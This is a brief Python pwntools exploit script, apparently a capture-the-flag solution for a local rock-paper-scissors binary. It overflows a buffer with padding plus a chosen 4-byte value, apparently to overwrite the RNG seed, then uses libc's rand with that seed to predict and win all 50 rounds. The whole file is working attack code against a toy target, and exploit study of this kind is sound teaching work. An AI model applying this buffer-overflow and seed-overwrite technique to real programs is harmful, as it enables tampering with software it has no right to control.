from pwn import *
from ctypes import *

target = "./rps"

p = process(target)

libc = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
libc.srand(0x42424242)

print p.recv()

payload = "A" * 0x30
payload += "\x42\x42\x42\x42"

p.sendline(payload)
print p.recv()

RPS = ['R', 'P', 'S']

for i in xrange(50):
	ans = RPS[((libc.rand() % 3)+1)%3]
	print ans
	p.sendline(ans)
	print p.recv()

